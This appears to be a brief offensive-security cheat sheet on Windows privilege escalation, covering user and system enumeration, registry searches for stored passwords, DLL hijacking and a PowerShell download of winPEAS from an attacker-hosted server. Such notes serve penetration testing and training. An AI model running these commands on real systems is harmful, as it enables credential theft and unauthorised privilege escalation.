### Information Gathering
User Enumeration
- `whoami /priv` Current user privileges
- `net users` List users
- `net user $username` Detail of a specific user
- `qwinsta` Other users logged in

<!-- -->
Misc
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"` get OS version
 - `wmic qfe get Caption,Description,HotFixID,InstalledOn` list updates on system
 - `wmic product get name,version,vendor` installed apps
 - `schtasks /query /fo LIST /v` query scheduled tasks
- `driverquery` list drivers installed
- `sc query windefend` is windows Defender on?
- `cmdkey /list` list
- `reg query HKLM /f password /t REG_SZ /s` registry key containing passwords
- `reg query HKCU /f password /t REG_SZ /s` registry key containing passwords
<!-- -->

### DLL Hijacking
DLL hijacking is an technique that can allow you to inject code into an application by replacing a legitimate DLL file with a malicious DLL file that will be called by the executable and run.

### Winpeas.exe
Local:
- `python -m SimpleHTTPServer 80`

<!-- -->
Remote: 
- `powershell.exe -command IWR -Uri $IP/winpeas.exe -OutFile winpeas.exe"`
- `winpeas.exe`
 <!-- -->
 
 [Windows Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)